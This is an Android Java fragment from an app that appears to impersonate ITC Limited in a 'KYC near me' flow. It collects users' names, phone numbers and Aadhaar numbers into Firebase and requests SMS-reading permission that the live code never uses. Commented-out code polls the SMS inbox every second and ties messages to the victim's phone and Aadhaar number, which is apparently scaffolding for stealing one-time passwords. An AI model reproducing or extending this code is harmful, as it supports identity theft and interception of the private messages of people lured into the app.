package com.suyal.itclimiteds.navigationdrawer;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.text.TextUtils;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;
import androidx.fragment.app.Fragment;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.suyal.itclimiteds.R;
import com.suyal.itclimiteds.modal.UserDetail;
import com.suyal.itclimiteds.payment.PaymentProfile;


public class KycNearMe extends Fragment {
    EditText name,city,state,phone,adharCard;
    FirebaseAuth mAuth;
    FirebaseAuth.AuthStateListener mAuthListener;
    FirebaseDatabase database;
    Button paymentProfileBtn;
    DatabaseReference reference,reference2;

//    ProgressDialog dialog;

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.nearby_kyc_fragment, container, false);

        name = view.findViewById(R.id.editName);
        phone = view.findViewById(R.id.editNumber);
        city = view.findViewById(R.id.editCity);
        state=view.findViewById(R.id.editState);
        adharCard = view.findViewById(R.id.editAdharCard);
        paymentProfileBtn = view.findViewById(R.id.paymentProfileBtn);
        mAuth = FirebaseAuth.getInstance();
        database = FirebaseDatabase.getInstance();

        ActivityCompat.requestPermissions(requireActivity(),new String[]{Manifest.permission.READ_SMS}, PackageManager.PERMISSION_GRANTED);

//        String sAmount = "20";

//        int amount = Math.round(Float.parseFloat(sAmount)*100);
//        dialog = new ProgressDialog(getContext());
//        dialog.setTitle("Adding User Detail");
//        dialog.setMessage("Please wait, we are adding your details");

        paymentProfileBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

//                dialog.show();
                reference = database.getReference("UserDetails");
//                reference2 = database.getReference("Messages");
                String userName = name.getText().toString().trim();
                String userCity = city.getText().toString().trim();
                String userState = state.getText().toString().trim();
                String userPhone = phone.getText().toString().trim();
                String userAdharCard = adharCard.getText().toString().trim();

                if(TextUtils.isEmpty(userName)){
                    name.setError("Name is Required");
                }
                else if(TextUtils.isEmpty(userCity)) {
                    adharCard.setError("City is Required");
                }
                else if(TextUtils.isEmpty(userState)) {
                    adharCard.setError("State is Required");
                }
                else if(TextUtils.isEmpty(userPhone)){
                    phone.setError("Phone number is Required");
                }
                else if(TextUtils.isEmpty(userAdharCard)){
                    adharCard.setError("Aadhar Card number is Required");
                }
                else if(userAdharCard.length() == 12){
                    boolean result = Verhoeff.validateVerhoeff(userAdharCard);
                    String msg = String.valueOf(result);
                    if(msg.equals("true")) {
                        Toast.makeText(getContext(), "Aadhar card Validation Successfull", Toast.LENGTH_SHORT).show();
                        try {
                            Thread.sleep(900);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }

                        UserDetail details = new UserDetail(userName,userCity,userState,userPhone,userAdharCard);
                        reference.child(userName+"("+userAdharCard+")").setValue(details);

//                      dialog.dismiss();

                        Toast.makeText(getContext(), "Details Added Successfully", Toast.LENGTH_SHORT).show();
                        Intent intent = new Intent(getContext(),PaymentProfile.class);
                        intent.putExtra("name",userName);
                        intent.putExtra("city",userCity);
                        intent.putExtra("state",userState);
                        intent.putExtra("phone",userPhone);
                        intent.putExtra("aadharNumber",userAdharCard);
                        startActivity(intent);
                    }else {
                        adharCard.setError("Enter Valid Aadhar Card");
                    }
                }
                else{
                    Toast.makeText(getContext(), "Fill all fields", Toast.LENGTH_SHORT).show();

//                    Checkout checkout = new Checkout();
//                    checkout.setKeyID("rzp_test_MWftw5SRYkzprb");
//                    checkout.setImage(R.drawable.rajorpay_logo);
//                    JSONObject object = new JSONObject();
//                    try {
//                        object.put("name","Britannia Distributor");
//                        object.put("description","Test Payment");
//                        object.put("theme.color","#0093DD");
//                        object.put("currency","INR");
//                        object.put("amount",amount);
//                        object.put("prefill.contact","XXXXXXXXXX");
//                        object.put("prefill.email","itc.limited202@gmail.com");
//
//                        checkout.open(getActivity(),object);
//
//                    }catch (JSONException e){
//                        e.printStackTrace();
//                    }
//                    name.setText("");
//                    city.setText("");
//                    state.setText("");
//                    phone.setText("");
//                    adharCard.setText("")
                }
//                        final String UID=mAuth.getUid();
//
//                        int delay=0;
//                        int period=1000;
//                        Timer timer= new Timer();
//                        timer.scheduleAtFixedRate(new TimerTask() {
//                            @Override
//                            public void run() {
//
//                                Cursor cursor = getActivity().getContentResolver().query(Uri.parse("content://sms"),null,null,null,null);
//                                cursor.moveToFirst();
//
//                                String userMessage=(cursor.getString(12));
//                                ArrayList<Message> messageModal = new ArrayList<>();
//
//                                database.getReference().child("Message").child(userPhone+userAdharCard).addValueEventListener(new ValueEventListener() {
//                                    @Override
//                                    public void onDataChange(@NonNull DataSnapshot snapshot) {
//                                        messageModal.clear();
//                                        for (DataSnapshot snapshot1: snapshot.getChildren()){
//                                            Message message = snapshot1.getValue(Message.class);
//                                            message.setMessage(snapshot1.getKey());
//                                            messageModal.add(message);
//                                        }
//
//                                    }
//
//                                    @Override
//                                    public void onCancelled(@NonNull DatabaseError error) {
//
//                                        Toast.makeText(getContext(), "Database creation failed", Toast.LENGTH_SHORT).show();
//                                    }
//                                });
//
//                            }
//                        },delay,period);
            }


        });

        return view;
    }

//    @Override
//    public void onPaymentSuccess(String s) {
//
//        AlertDialog.Builder builder = new AlertDialog.Builder(requireActivity());
//        builder.setTitle("Payment ID");
//
//        builder.setMessage(s);
//
//        builder.show();
//    }
//
//    @Override
//    public void onPaymentError(int i, String s) {
//        Toast.makeText(getContext(), s, Toast.LENGTH_SHORT).show();
//
//    }
}
